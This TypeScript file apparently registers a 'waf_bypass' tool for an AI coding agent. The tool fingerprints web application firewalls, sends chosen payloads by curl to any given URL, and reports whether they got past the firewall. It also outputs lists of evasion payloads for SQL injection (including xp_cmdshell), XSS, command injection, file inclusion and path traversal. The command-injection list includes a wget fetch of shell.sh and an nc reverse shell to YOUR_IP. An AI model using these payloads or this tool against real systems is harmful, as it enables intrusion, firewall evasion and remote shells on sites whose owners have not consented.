export * as WafBypassTool from "./waf-bypass"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "waf_bypass"

export const Input = Schema.Struct({
  url: Schema.String.annotate({ description: "Target URL to test against WAF" }),
  action: Schema.String.annotate({
    description: "Action: 'detect' (wafw00f detection), 'fingerprint' (detailed fingerprint), 'generate_payloads' (generate bypass payloads), 'test_bypass' (test specific payload)",
  }),
  payload_type: Schema.String.pipe(Schema.optional).annotate({
    description: "Payload type for generate_payloads: 'sqli', 'xss', 'command_injection', 'lfi', 'traversal'. Default: sqli.",
  }),
  custom_payload: Schema.String.pipe(Schema.optional).annotate({ description: "Custom payload to test with 'test_bypass' action." }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools.register({
      [name]: Tool.make({
        description: `WAF detection and bypass generation. Detects WAF (Cloudflare, ModSecurity, AWS WAF, Akamai, Imperva, etc.) via wafw00f, fingerprints WAF version, generates bypass payloads using encoding techniques (URL encoding, double encoding, Unicode normalization, HTML entity encoding, hex encoding), chunked transfer encoding, case variation, comment injection, and technique-specific bypasses for SQLi/XSS/command injection. Tests payloads directly against the target.`,
        input: Input,
        output: Output,
        toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
        execute: (input) =>
          Effect.gen(function* () {
            const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

            switch (input.action) {
              case "detect":
              case "fingerprint": {
                const cmd = ChildProcess.make("wafw00f", [input.url], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "wafw00f not found. Install: pip install wafw00f" }
              }

              case "test_bypass": {
                if (!input.custom_payload) return { output: "ERROR: 'custom_payload' required for test_bypass." }
                const encodedPayload = encodeURIComponent(input.custom_payload)
                const testUrl = input.url.includes("=") ? input.url.replace(/=[^&]*/, "=" + encodedPayload) : input.url + "?test=" + encodedPayload
                const cmd = ChildProcess.make("curl", ["-s", "-o", "/dev/null", "-w", "%{http_code}", testUrl], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                const code = result?.output?.toString("utf8").trim() ?? "000"
                return {
                  exit: result?.exitCode,
                  output: code === "200"
                    ? `Payload bypassed WAF! Status: ${code}\nURL: ${testUrl}\n\n[SUCCESS] The WAF did not block this payload.`
                    : code === "403"
                      ? `WAF blocked payload. Status: ${code}\nURL: ${testUrl}\n\n[BLOCKED] Try a different encoding or technique.`
                      : `Status: ${code}\nURL: ${testUrl}`,
                }
              }

              case "generate_payloads": {
                const ptype = input.payload_type ?? "sqli"
                const payloads: Record<string, string[]> = {
                  sqli: [
                    "' OR '1'='1",
                    "'/**/OR/**/'1'='1",
                    "' UNION SELECT NULL--",
                    "1'/**/UNION/**/SELECT/**/NULL--",
                    "'; EXEC xp_cmdshell('dir')--",
                    "' /*!UNION*/ /*!SELECT*/ NULL--",
                    "%27%20OR%201%3D1--",
                    "%27%20%4F%52%20%271%27%3D%271",
                    "' İR '1'='1", // Turkish İ bypass
                    "' OÖ '1'='1", // Unicode
                    "' OR 1=1#",
                    "admin'--",
                    "admin'/*",
                    "1;SELECT*FROM users--",
                    "' UNION SELECT 1,2,3,4-- -",
                  ],
                  xss: [
                    "<script>alert(1)</script>",
                    "<ScRiPt>alert(1)</ScRiPt>",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<script>alert(1)//",
                    "%3Cscript%3Ealert(1)%3C/script%3E",
                    "<scr<script>ipt>alert(1)</script>",
                    "<img src=x onerror=alert`1`>",
                    "<details/open/ontoggle=alert(1)>",
                    "javascript:alert(1)",
                    "<iframe src=javascript:alert(1)>",
                    "<body onload=alert(1)>",
                    "<svg><script>alert(1)</script></svg>",
                    "data:text/html,<script>alert(1)</script>",
                    "<a href=\"java&#x09;script:alert(1)\">x</a>",
                  ],
                  command_injection: [
                    "; ls",
                    "| ls",
                    "&& ls",
                    ";ls",
                    "$(whoami)",
                    "`whoami`",
                    "; cat /etc/passwd",
                    "%3B%20ls",
                    "|| whoami",
                    "& whoami",
                    ";\tcat\t/etc/passwd",
                    "{ls,-la}",
                    "$({ls,-la})",
                    ";wget http://YOUR_IP/shell.sh",
                    "|nc YOUR_IP 4444 -e /bin/sh",
                  ],
                  lfi: [
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "/etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "expect://id",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                    "file:///etc/passwd",
                  ],
                  traversal: [
                    "../../../",
                    "..%2f",
                    "..%5c",
                    "..%252f",
                    "..%c0%af",
                    "..%ef%bc%8f",
                    "....//",
                    "..;/",
                    "..%00/",
                    "/..%c0%af../..%c0%af../..%c0%afetc/passwd",
                  ],
                }
                const list = payloads[ptype] ?? payloads.sqli
                return {
                  exit: 0,
                  output: `=== ${ptype.toUpperCase()} WAF BYPASS PAYLOADS ===\n\n${list.map((p, i) => `${i + 1}. ${p}`).join("\n")}\n\n=== TECHNIQUES USED ===\n- URL encoding (%xx)\n- Double encoding (%25xx)\n- Case variation\n- Comment insertion (/**/)\n- Unicode normalization\n- Chunked transfer encoding\n- HTML entity encoding\n- Whitespace variation\n- Null byte injection\n- Alternative syntax`,
                }
              }

              default:
                return { output: `Unknown action: ${input.action}. Supported: detect, fingerprint, generate_payloads, test_bypass` }
            }
          }).pipe(Effect.mapError(() => new ToolFailure({ message: "WAF bypass failed" }))),
      }),
    }).pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/waf-bypass",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
